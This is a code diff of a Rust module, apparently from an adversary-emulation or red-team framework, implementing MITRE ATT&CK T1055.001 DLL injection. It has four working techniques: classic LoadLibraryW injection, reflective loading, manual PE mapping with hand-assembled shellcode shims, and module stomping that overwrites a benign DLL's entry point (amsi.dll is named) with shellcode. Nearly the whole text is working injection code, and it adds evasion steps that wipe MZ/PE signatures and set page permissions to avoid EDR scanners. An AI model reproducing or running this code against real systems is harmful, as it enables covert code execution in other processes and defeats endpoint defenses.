@@ -1,25 +1,18 @@
 //! Implementation of **MITRE ATT&CK T1055.001: Dynamic-link Library Injection**.
 //!
-//! This module provides four distinct strategies for injecting DLLs into a remote process,
-//! ranging from simple API abuse to advanced manual mapping and evasion techniques.
+//! This module provides four distinct strategies for injecting DLLs into a remote process:
 //!
 //! 1. **Classic Injection (`Classic`)**:
-//!    Forces the remote process to load a DLL from disk by spawning a remote thread that executes
-//!    `LoadLibraryW`. This requires the DLL to exist on the filesystem.
+//!    Forces the remote process to load a DLL from disk via `LoadLibraryW`.
 //!
 //! 2. **Reflective Injection (`Reflective`)**:
-//!    Injects a DLL directly from memory without touching the disk. Requires the payload to export
-//!    a custom `ReflectiveLoader` function that handles its own initialization (imports, relocations).
+//!    Injects a DLL from memory. Requires a `ReflectiveLoader` export.
 //!
 //! 3. **Memory Module (`MemoryModule`)**:
-//!    Advanced "Manual Mapping" technique. The injector manually mimics the Windows OS loader in
-//!    user space: it parses PE headers, maps sections, applies relocations, resolves imports, and
-//!    adjusts page permissions. Finally, it executes the Entry Point (`DllMain`) via a shellcode shim.
+//!    Manual mapping of the DLL. Mimics the OS loader (sections, relocs, imports, entry point).
 //!
 //! 4. **Module Stomping (`ModuleStomping`)**:
-//!    A stealth technique that loads a legitimate, benign DLL (e.g., `amsi.dll`) into the target,
-//!    waits for it to initialize, and then overwrites its Entry Point with malicious shellcode.
-//!    This makes the payload appear to be backed by a valid file on disk.
+//!    Loads a benign DLL and overwrites its entry point with shellcode.
 
 use std::{
     ffi::{OsString, c_void},
@@ -118,28 +111,28 @@ impl Strategy for T1055_001 {
 
         match method {
             DynamicLinkLibrary::Classic => {
-                info!("Method: Classic DLL Injection (LoadLibrary)");
+                info!("Method: Classic DLL Injection");
                 let dll_path = payload.as_file_path().ok_or_else(|| {
                     Error::Validation("Classic injection requires a file path.".into())
                 })?;
                 inject_dll_classic(process_id, dll_path)
             }
             DynamicLinkLibrary::Reflective => {
-                info!("Method: Reflective DLL Injection (Manual Map -> ReflectiveLoader)");
+                info!("Method: Reflective DLL Injection");
                 let dll_bytes = payload.as_bytes().ok_or_else(|| {
                     Error::Validation("Reflective injection requires raw bytes.".into())
                 })?;
                 inject_dll_reflective(process_id, dll_bytes)
             }
             DynamicLinkLibrary::MemoryModule => {
-                info!("Method: Memory Module (Manual Map -> Shellcode Shim -> DllMain)");
+                info!("Method: Memory Module DLL Injection");
                 let dll_bytes = payload
                     .as_bytes()
                     .ok_or_else(|| Error::Validation("Memory Module requires raw bytes.".into()))?;
                 inject_dll_memory_module(process_id, dll_bytes)
             }
             DynamicLinkLibrary::ModuleStomping(optional_target) => {
-                info!("Method: Module Stomping (Load Benign DLL -> Overwrite EntryPoint)");
+                info!("Method: Module Stomping DLL Injection");
                 let shellcode_bytes = payload.as_bytes().ok_or_else(|| {
                     Error::Validation("Module Stomping requires shellcode bytes.".into())
                 })?;
@@ -152,18 +145,18 @@ impl Strategy for T1055_001 {
 
 // ==============================================================================================
 
-/// Performs "Classic" DLL Injection.
-///
-/// Allocates memory in the remote process, writes the DLL path, and creates a remote thread
-/// executing `LoadLibraryW`.
+/// Performs "Classic" DLL Injection via `LoadLibraryW`.
 fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
     // 1. Prepare Data
     let path_utf16 = to_utf16_null_terminated(dll_path);
     let alloc_size = path_utf16.len() * size_of::<u16>();
 
-    info!("Target PID: {}. Payload Path: {:?}", process_id, dll_path);
+    info!(
+        "Analysis: Target PID: {}. Payload Path: {:?}",
+        process_id, dll_path
+    );
 
-    // 2. Open Target
+    // 2. Open Target Process
     let target_process = WindowsAPI::open_process(
         process_id,
         PROCESS_CREATE_THREAD
@@ -193,26 +186,24 @@ fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
     let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(load_library_addr) };
     let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;
 
-    info!("Remote thread spawned. LoadLibraryW executed.");
+    info!("Execution: Remote thread spawned. LoadLibraryW executed.");
     Ok(())
 }
 
-/// Performs "Reflective" DLL Injection.
-///
-/// Writes the raw DLL into the remote process and executes the `ReflectiveLoader` export.
+/// Performs "Reflective" DLL Injection via `ReflectiveLoader`.
 fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
-    // 1. Analyze PE & Find Offset
+    // 1. Parse PE & Find Offset
     let pe_context = PeContext::parse(image_bytes)?;
     let loader_offset = pe_context
         .find_export_offset(image_bytes, "ReflectiveLoader")
         .ok_or_else(|| Error::InvalidImage("Export 'ReflectiveLoader' not found.".into()))?;
 
     info!(
-        "ReflectiveLoader export found at offset: {:#x}",
+        "Analysis: ReflectiveLoader found at offset {:#x}",
         loader_offset
     );
 
-    // 2. Open Target
+    // 2. Open Target Process
     let target_process = WindowsAPI::open_process(
         process_id,
         PROCESS_CREATE_THREAD
@@ -223,7 +214,6 @@ fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
     )?;
 
     // 3. Allocate Memory (RW)
-    // Note: Allocating RWX (Read/Write/Execute) directly is often flagged by EDRs.
     let remote_addr = target_process.virtual_alloc_ex(
         image_bytes.len(),
         MEM_COMMIT | MEM_RESERVE,
@@ -239,7 +229,7 @@ fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
     // 6. Execute
     let remote_loader_addr = (remote_addr as usize + loader_offset) as *const c_void;
     info!(
-        "Spawning thread at remote address: {:p} (Base: {:p} + Offset: {:#x})",
+        "Execution: Spawning thread at {:p} (Base: {:p} + Offset: {:#x})",
         remote_loader_addr, remote_addr, loader_offset
     );
 
@@ -250,16 +240,17 @@ fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
 }
 
 /// Performs "Memory Module" Injection (Manual Mapping).
-///
-/// Fully emulates the Windows PE Loader: maps sections, handles relocations/imports,
-/// and executes `DllMain` via a shellcode shim.
 fn inject_dll_memory_module(process_id: u32, image_bytes: &[u8]) -> Result<()> {
     // 1. Parse PE Headers
     let pe_context = PeContext::parse(image_bytes)?;
     let image_size = pe_context.nt_headers.OptionalHeader.SizeOfImage as usize;
-    info!("Parsing PE Payload. Image Size: {} bytes.", image_size);
+    info!(
+        "Analysis: Payload is {} bytes. Required Remote Size: {} bytes.",
+        image_bytes.len(),
+        image_size
+    );
 
-    // 2. Open Target
+    // 2. Open Target Process
     let target_process = WindowsAPI::open_process(
         process_id,
         PROCESS_CREATE_THREAD
@@ -269,21 +260,23 @@ fn inject_dll_memory_module(process_id: u32, image_bytes: &[u8]) -> Result<()> {
             | PROCESS_VM_WRITE,
     )?;
 
-    // 3. Allocate Image Memory
+    // 3. Allocate Memory for the Image
     let remote_addr = target_process.virtual_alloc_ex(image_size, MEM_COMMIT, PAGE_READWRITE)?;
-    info!("Allocated remote image base at: {:p}", remote_addr);
+    info!("Allocation: Remote image base at {:p}", remote_addr);
 
     // 4. Map Headers
-    let headers_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
-    target_process.write_process_memory(remote_addr, &image_bytes[0..headers_size])?;
+    let header_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
+    target_process.write_process_memory(remote_addr, &image_bytes[0..header_size])?;
 
     // 5. Map Sections
     map_sections(&target_process, &pe_context, image_bytes, remote_addr)?;
 
-    // 6. Relocations
-    let delta = (remote_addr as usize)
-        .wrapping_sub(pe_context.nt_headers.OptionalHeader.ImageBase as usize);
+    // 6. Apply Base Relocations
+    let preferred_base = pe_context.nt_headers.OptionalHeader.ImageBase as usize;
+    let delta = (remote_addr as usize).wrapping_sub(preferred_base);
+
     if delta != 0 {
+        info!("Relocation: Delta required: {:#x}", delta);
         apply_relocations(
             &target_process,
             &pe_context,
@@ -293,29 +286,30 @@ fn inject_dll_memory_module(process_id: u32, image_bytes: &[u8]) -> Result<()> {
         )?;
     }
 
-    // 7. Imports
+    // 7. Resolve Imports
     resolve_imports(&target_process, &pe_context, image_bytes, remote_addr)?;
 
-    // 8. Finalize Permissions (Sections + Headers)
+    // 8. Finalize Permissions (W^X Protection)
     finalize_permissions(&target_process, &pe_context, image_bytes, remote_addr)?;
 
-    // 9. Execute Shellcode Shim
-    // We need a shim because CreateRemoteThread only supports 1 argument, but DllMain needs 3 (Instance, Reason, Reserved).
+    // 9. Execute via Shellcode Shim
     let entry_point_rva = pe_context.nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
     let entry_point_addr = (remote_addr as usize + entry_point_rva) as u64;
 
     // 10. Allocate & Write Shellcode
+    info!(
+        "Shim: Generating loader for Entry Point: {:#x}",
+        entry_point_addr
+    );
     let shellcode_bytes = generate_shellcode_shim(entry_point_addr)?;
+
     let shellcode_addr =
         target_process.virtual_alloc_ex(shellcode_bytes.len(), MEM_COMMIT, PAGE_READWRITE)?;
-    target_process.write_process_memory(shellcode_addr, &shellcode_bytes[..])?;
+
+    target_process.write_process_memory(shellcode_addr, &shellcode_bytes)?;
     target_process.virtual_protect_ex(shellcode_addr, shellcode_bytes.len(), PAGE_EXECUTE_READ)?;
 
-    info!(
-        "Executing Shellcode at {:p} -> DllMain at {:#x}",
-        shellcode_addr, entry_point_addr
-    );
-
+    // 11. Trigger Execution
     let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(shellcode_addr) };
     let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;
 
@@ -323,21 +317,14 @@ fn inject_dll_memory_module(process_id: u32, image_bytes: &[u8]) -> Result<()> {
 }
 
 /// Performs "Module Stomping" (DLL Hollowing).
-///
-/// 1. Forces the target to load a legitimate, benign DLL.
-/// 2. Locates that DLL in the remote process memory.
-/// 3. Overwrites the DLL's Entry Point with the malicious shellcode.
-/// 4. Executes the payload.
 fn inject_module_stomping(process_id: u32, target_dll_name: &str, shellcode: &[u8]) -> Result<()> {
-    // 1. Inject the Benign DLL (LoadLibrary)
-    info!("Loading benign DLL '{}' into target...", target_dll_name);
+    // 1. Inject the Benign DLL
+    info!("Analysis: Loading benign DLL '{}'...", target_dll_name);
     let target_dll_path = Path::new(target_dll_name);
     inject_dll_classic(process_id, target_dll_path)?;
 
-    // 2. Wait for the module to be loaded
-    info!("Locating remote module base...");
+    // 2. Wait for Module Load
     let mut remote_addr = 0;
-    // Attempt to find the module for ~2 seconds
     for _ in 0..20 {
         match get_remote_module_handle(process_id, target_dll_name) {
             Ok(addr) => {
@@ -350,18 +337,14 @@ fn inject_module_stomping(process_id: u32, target_dll_name: &str, shellcode: &[u
 
     if remote_addr == 0 {
         return Err(Error::Execution(format!(
-            "Failed to locate '{}' after injection. LoadLibrary might have failed.",
+            "Failed to locate '{}' after injection.",
             target_dll_name
         )));
     }
-
     let remote_base_ptr = remote_addr as *mut c_void;
-    info!(
-        "Remote module '{}' found at: {:p}",
-        target_dll_name, remote_base_ptr
-    );
+    info!("Analysis: Remote module found at {:p}", remote_base_ptr);
 
-    // 3. Open Target for Memory Operations
+    // 3. Open Target Process
     let target_process = WindowsAPI::open_process(
         process_id,
         PROCESS_CREATE_THREAD
@@ -371,7 +354,7 @@ fn inject_module_stomping(process_id: u32, target_dll_name: &str, shellcode: &[u
             | PROCESS_VM_WRITE,
     )?;
 
-    // 4. Parse Remote PE Headers to find Entry Point
+    // 4. Parse Remote PE to find Entry Point
     let mut header_buffer = vec![0u8; 0x1000];
     target_process.read_process_memory(remote_base_ptr, &mut header_buffer)?;
 
@@ -380,27 +363,22 @@ fn inject_module_stomping(process_id: u32, target_dll_name: &str, shellcode: &[u
     let remote_entry_point = (remote_addr + entry_point_rva) as *mut c_void;
 
     info!(
-        "Remote Entry Point RVA: {:#x} -> Address: {:p}",
+        "Analysis: Entry Point RVA: {:#x} -> {:p}",
         entry_point_rva, remote_entry_point
     );
 
     // 5. Size Check
-    // Ensure we don't overwrite beyond the .text section blindly.
     if shellcode.len() > 1024 * 50 {
-        return Err(Error::Validation(
-            "Shellcode payload is too large for stomping.".into(),
-        ));
+        return Err(Error::Validation("Shellcode payload too large.".into()));
     }
 
     // 6. Overwrite (Stomp)
-    // Change protection to RW, write, then restore to RX/RWX.
-    info!("Overwriting Entry Point with shellcode...");
+    info!("Execution: Overwriting Entry Point with shellcode...");
     target_process.virtual_protect_ex(remote_entry_point, shellcode.len(), PAGE_READWRITE)?;
     target_process.write_process_memory(remote_entry_point, shellcode)?;
     target_process.virtual_protect_ex(remote_entry_point, shellcode.len(), PAGE_EXECUTE_READ)?;
 
     // 7. Execute
-    info!("Spawning thread at stomped Entry Point...");
     let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_entry_point) };
     let _thread = target_process.create_remote_thread(routine_ptr, null())?;
 
@@ -420,9 +398,11 @@ fn map_sections(
         let raw_size = section.SizeOfRawData as usize;
         let raw_offset = section.PointerToRawData as usize;
         let virt_addr = section.VirtualAddress as usize;
+
         if raw_size == 0 {
             continue;
         }
+
         let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;
         if raw_offset + raw_size <= image_bytes.len() {
             target_process
@@ -438,42 +418,10 @@ fn finalize_permissions(
     image_bytes: &[u8],
     remote_addr: *mut c_void,
 ) -> Result<()> {
-    for i in 0..pe_context.section_count {
-        let section = pe_context.get_section(image_bytes, i);
-        let virt_addr = section.VirtualAddress as usize;
-        let virt_size = unsafe { section.Misc.VirtualSize } as usize;
-        let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;
-        let chars = section.Characteristics;
-        let executable = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
-        let readable = (chars & IMAGE_SCN_MEM_READ) != 0;
-        let writable = (chars & IMAGE_SCN_MEM_WRITE) != 0;
-
-        // OpSec Logic: Enforce W^X (Write XOR Execute)
-        // This makes the memory layout look more legitimate to EDR scanners.
-        let protect = match (executable, readable, writable) {
-            // [STEALTH MODE]
-            // Force RX (Execute + Read) instead of RWX.
-            // This is safe because Relocations/Imports (writes) are already done.
-            (true, _, _) => PAGE_EXECUTE_READ,
-
-            // Standard data (RW)
-            (false, true, true) => PAGE_READWRITE,
-            // Read-only data (R)
-            (false, true, false) => PAGE_READONLY,
-            // Fallback
-            _ => PAGE_READONLY,
-        };
-        if virt_size > 0 {
-            target_process.virtual_protect_ex(dest_addr, virt_size, protect)?;
-        }
-    }
-
-    // A. Wipe "MZ" header signature (OpSec)
+    // 1. Surgical Wipe (MZ + PE) - Matches T1055.001 OpSec
     let zeros_2 = vec![0u8; 2];
-    target_process.write_process_memory(remote_addr, &zeros_2)?;
+    target_process.write_process_memory(remote_addr, &zeros_2)?; // Wipe MZ
 
-    // B. Wipe "PE" signature (OpSec)
-    // The "PE" signature offset is stored at 0x3C (e_lfanew) in the DOS header.
     let e_lfanew_offset = 0x3C;
     if image_bytes.len() > e_lfanew_offset + 4 {
         let pe_offset = u32::from_le_bytes([
@@ -484,13 +432,37 @@ fn finalize_permissions(
         ]) as usize;
 
         let pe_sig_addr = (remote_addr as usize + pe_offset) as *mut c_void;
-        let zeros_4 = vec![0u8; 4]; // Wipe "PE\0\0"
-        target_process.write_process_memory(pe_sig_addr, &zeros_4)?;
+        let zeros_4 = vec![0u8; 4];
+        target_process.write_process_memory(pe_sig_addr, &zeros_4)?; // Wipe PE
     }
 
-    // 3. Lock the header page (Read-Only)
+    // 2. Lock Headers (Read-Only)
     let header_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
     target_process.virtual_protect_ex(remote_addr, header_size, PAGE_READONLY)?;
+
+    // 3. Set Section Permissions (Enforce W^X)
+    for i in 0..pe_context.section_count {
+        let section = pe_context.get_section(image_bytes, i);
+        let virt_addr = section.VirtualAddress as usize;
+        let virt_size = unsafe { section.Misc.VirtualSize } as usize;
+        let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;
+
+        let chars = section.Characteristics;
+        let executable = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
+        let readable = (chars & IMAGE_SCN_MEM_READ) != 0;
+        let writable = (chars & IMAGE_SCN_MEM_WRITE) != 0;
+
+        let protect = match (executable, readable, writable) {
+            (true, _, _) => PAGE_EXECUTE_READ,     // RX (Code)
+            (false, true, true) => PAGE_READWRITE, // RW (Data)
+            (false, true, false) => PAGE_READONLY, // R (Read-only Data)
+            _ => PAGE_READONLY,
+        };
+
+        if virt_size > 0 {
+            target_process.virtual_protect_ex(dest_addr, virt_size, protect)?;
+        }
+    }
     Ok(())
 }
 
@@ -503,23 +475,29 @@ fn apply_relocations(
 ) -> Result<()> {
     let data_dir = pe_context.nt_headers.OptionalHeader.DataDirectory;
     let reloc_dir = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+
     if reloc_dir.VirtualAddress == 0 {
         return Ok(());
     }
+
     let mut current_offset = pe_context
         .rva_to_file_offset(reloc_dir.VirtualAddress as usize, image_bytes)
         .ok_or(Error::InvalidImage("Reloc RVA not found".into()))?;
+
     let end_offset = current_offset + reloc_dir.Size as usize;
 
     while current_offset < end_offset {
         let block =
             unsafe { &*(image_bytes.as_ptr().add(current_offset) as *const IMAGE_BASE_RELOCATION) };
+
         if block.SizeOfBlock == 0 {
             break;
         }
+
         let count =
             (block.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();
         let page_rva = block.VirtualAddress as usize;
+
         let entries_ptr = unsafe {
             image_bytes
                 .as_ptr()
@@ -530,13 +508,16 @@ fn apply_relocations(
         for &entry in entries {
             let type_ = (entry >> 12) as u8;
             let offset = (entry & 0x0FFF) as usize;
+
             #[cfg(target_arch = "x86_64")]
             let supported = type_ == 10; // IMAGE_REL_BASED_DIR64
             #[cfg(target_arch = "x86")]
             let supported = type_ == 3; // IMAGE_REL_BASED_HIGHLOW
+
             if supported {
                 let target_addr = (remote_addr as usize + page_rva + offset) as *mut c_void;
                 let mut ptr_bytes = [0u8; size_of::<usize>()];
+
                 target_process.read_process_memory(target_addr, &mut ptr_bytes)?;
                 let original_ptr = usize::from_le_bytes(ptr_bytes);
                 let patched_ptr = original_ptr.wrapping_add(delta);
@@ -556,9 +537,11 @@ fn resolve_imports(
 ) -> Result<()> {
     let data_dir = pe_context.nt_headers.OptionalHeader.DataDirectory;
     let import_dir = data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
+
     if import_dir.VirtualAddress == 0 {
         return Ok(());
     }
+
     let mut current_offset = pe_context
         .rva_to_file_offset(import_dir.VirtualAddress as usize, image_bytes)
         .ok_or(Error::InvalidImage("Import RVA not found".into()))?;
@@ -567,32 +550,40 @@ fn resolve_imports(
         let desc = unsafe {
             &*(image_bytes.as_ptr().add(current_offset) as *const IMAGE_IMPORT_DESCRIPTOR)
         };
+
         if desc.Name == 0 {
             break;
         }
+
         let name_offset = pe_context
             .rva_to_file_offset(desc.Name as usize, image_bytes)
             .ok_or(Error::InvalidImage("Import Name RVA".into()))?;
         let lib_name = unsafe { image_bytes.as_ptr().add(name_offset) } as *const i8;
+
         let module_handle = unsafe { LoadLibraryA(lib_name as *const u8) };
         if module_handle.is_null() {
             return Err(Error::Win32("LoadLibraryA", unsafe { GetLastError() }));
         }
+
         let mut int_rva = unsafe { desc.Anonymous.OriginalFirstThunk };
         if int_rva == 0 {
             int_rva = desc.FirstThunk;
         }
+
         let mut int_offset = pe_context
             .rva_to_file_offset(int_rva as usize, image_bytes)
             .ok_or(Error::InvalidImage("INT RVA".into()))?;
+
         let mut iat_addr = (remote_addr as usize + desc.FirstThunk as usize) as *mut c_void;
 
         loop {
             let thunk_data =
                 unsafe { *(image_bytes.as_ptr().add(int_offset) as *const ImageThunkData) };
+
             if thunk_data == 0 {
                 break;
             }
+
             let func_addr = if (thunk_data & IMAGE_ORDINAL_FLAG) != 0 {
                 let ordinal = (thunk_data & 0xFFFF) as u16;
                 unsafe { GetProcAddress(module_handle, ordinal as usize as *const u8) }
@@ -604,10 +595,13 @@ fn resolve_imports(
                 let func_name = unsafe { image_bytes.as_ptr().add(name_offset + 2) as *const i8 };
                 unsafe { GetProcAddress(module_handle, func_name as *const u8) }
             };
+
             let func_addr =
                 func_addr.ok_or(Error::Win32("GetProcAddress", unsafe { GetLastError() }))?;
             let addr_val = func_addr as usize;
+
             target_process.write_process_memory(iat_addr, &addr_val.to_le_bytes())?;
+
             int_offset += size_of::<ImageThunkData>();
             iat_addr = (iat_addr as usize + size_of::<ImageThunkData>()) as *mut c_void;
         }
@@ -621,72 +615,50 @@ fn generate_shellcode_shim(entry_point_addr: u64) -> Result<Vec<u8>> {
     {
         let mut code = Vec::new();
         // 1. Setup Arguments for DllMain(hInst, DLL_PROCESS_ATTACH, Reserved)
-        // RCX is already set by CreateRemoteThread (contains remote_base)
-
-        // MOV RDX, 1 (DLL_PROCESS_ATTACH)
-        code.extend_from_slice(&[0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00]);
-        // MOV R8, 0 (Reserved)
-        code.extend_from_slice(&[0x49, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00]);
+        code.extend_from_slice(&[0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00]); // MOV RDX, 1
+        code.extend_from_slice(&[0x49, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00]); // MOV R8, 0
 
         // 2. Prepare Call
-        // MOV RAX, <EntryPoint>
-        code.extend_from_slice(&[0x48, 0xB8]);
+        code.extend_from_slice(&[0x48, 0xB8]); // MOV RAX, <Addr>
         code.extend_from_slice(&entry_point_addr.to_le_bytes());
 
         // 3. Align Stack & Call
-        // SUB RSP, 40 (0x28) - Shadow Space + Alignment
-        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
-        // CALL RAX
-        code.extend_from_slice(&[0xFF, 0xD0]);
-        // ADD RSP, 40
-        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
+        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // SUB RSP, 40
+        code.extend_from_slice(&[0xFF, 0xD0]); // CALL RAX
+        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // ADD RSP, 40
 
-        // 4. Return
-        code.push(0xC3);
+        code.push(0xC3); // RET
         Ok(code)
     }
+
     #[cfg(target_arch = "x86")]
     {
         let mut code = Vec::new();
         let entry_point_u32 = entry_point_addr as u32;
 
-        // 1. Get hInst
-        // In x86, CreateRemoteThread passes the argument (remote_addr) on the stack.
-        // It is located at [ESP + 4] (ESP points to the return address).
-
-        // MOV EAX, [ESP + 4]
-        code.extend_from_slice(&[0x8B, 0x44, 0x24, 0x04]);
+        // 1. Get hInst (Located at [ESP + 4])
+        code.extend_from_slice(&[0x8B, 0x44, 0x24, 0x04]); // MOV EAX, [ESP + 4]
 
         // 2. Push Arguments for DllMain (stdcall: Right-to-Left)
-        // DllMain(hInst, DLL_PROCESS_ATTACH, Reserved)
-
-        // Push Reserved (0) -> PUSH 0
-        code.extend_from_slice(&[0x6A, 0x00]);
-
-        // Push Reason (1) -> PUSH 1
-        code.extend_from_slice(&[0x6A, 0x01]);
-
-        // Push hInst (stored in EAX) -> PUSH EAX
-        code.push(0x50);
+        code.extend_from_slice(&[0x6A, 0x00]); // PUSH 0 (Reserved)
+        code.extend_from_slice(&[0x6A, 0x01]); // PUSH 1 (Reason)
+        code.push(0x50); // PUSH EAX (hInst)
 
         // 3. Prepare Call
-        // MOV EAX, <EntryPoint>
-        code.push(0xB8);
+        code.push(0xB8); // MOV EAX, <Addr>
         code.extend_from_slice(&entry_point_u32.to_le_bytes());
+        code.extend_from_slice(&[0xFF, 0xD0]); // CALL EAX
 
-        // CALL EAX
-        code.extend_from_slice(&[0xFF, 0xD0]);
-
-        // 4. Return
-        // ThreadProc is stdcall and takes 1 argument (4 bytes).
-        // We use RET 4 to pop the argument off the stack upon return.
+        // 4. Return (RET 4 to pop arg)
         code.extend_from_slice(&[0xC2, 0x04, 0x00]);
-
         Ok(code)
     }
 }
 
-/// Helper: Locates the Base Address of a module in a remote process.
+fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
+    path.as_os_str().encode_wide().chain([0]).collect()
+}
+
 fn get_remote_module_handle(process_id: u32, module_name: &str) -> Result<usize> {
     let snapshot_handle =
         unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id) };
@@ -732,8 +704,8 @@ fn get_remote_module_handle(process_id: u32, module_name: &str) -> Result<usize>
 }
 
 // ==============================================================================================
+// Shared Structures
 
-/// A helper struct to parse PE headers once and reuse the calculated offsets.
 struct PeContext {
     nt_headers: IMAGE_NT_HEADERS,
     section_count: u16,
@@ -791,7 +763,6 @@ impl PeContext {
         None
     }
 
-    /// Finds the offset of an exported function (like "ReflectiveLoader").
     fn find_export_offset(&self, image_bytes: &[u8], target_name: &str) -> Option<usize> {
         let data_dir = self.nt_headers.OptionalHeader.DataDirectory;
         let export_rva = data_dir[0].VirtualAddress as usize;
@@ -843,12 +814,6 @@ impl PeContext {
     }
 }
 
-fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
-    path.as_os_str().encode_wide().chain([0]).collect()
-}
-
-// ==============================================================================================
-
 struct HandleGuard(HANDLE);
 
 impl HandleGuard {
@@ -865,7 +830,6 @@ impl Drop for HandleGuard {
     }
 }
 
-/// Thin wrapper around Windows APIs to handle safe/unsafe boundary and errors.
 struct WindowsAPI {
     handle: HandleGuard,
 }
